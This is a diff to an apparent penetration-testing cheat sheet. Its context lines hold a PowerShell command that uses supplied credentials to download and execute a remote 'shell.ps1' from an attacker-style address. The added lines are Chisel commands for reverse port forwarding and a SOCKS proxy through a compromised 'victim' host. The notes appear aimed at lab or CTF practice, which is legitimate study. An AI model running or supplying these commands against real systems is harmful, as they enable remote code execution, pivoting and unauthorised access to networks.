@@ -317,3 +317,23 @@ $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
 Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
 ```
+
+* Chisel
+
+```
+Listener
+chisel server -p 8000 --reverse
+
+Victim
+
+Listen on Kali 80, forward to localhost port 80 on client
+chisel client 10.10.14.3:8000 R:80:127.0.0.1:80
+
+
+Listen on Kali 4444, forward to 10.10.10.240 port 80
+chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80
+
+
+Create SOCKS5 listener on 1080 on Kali, proxy through client
+chisel client 10.10.14.3:8000 R:socks	
+```
